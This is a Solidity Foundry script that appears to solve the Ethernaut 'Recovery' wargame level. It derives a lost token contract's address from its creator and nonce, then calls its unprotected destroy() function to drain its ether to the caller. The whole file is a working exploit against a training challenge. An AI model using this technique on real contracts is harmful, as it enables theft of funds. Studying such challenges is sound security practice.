// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/level17.sol";

contract Attacker {
    Recovery level;

    constructor(address level_) {
        level = Recovery(level_);
    }

    function attack() public {
        address payable lostContract = payable(address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(level), bytes1(0x01)))))
        ));

        SimpleToken(lostContract).destroy(payable(msg.sender));
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x5B78B2E2ccFD96d2a064A7c20f6eEFcDff851106;

        Attacker attacker = new Attacker(levelAddr);

        attacker.attack();

        vm.stopBroadcast();
    }
}
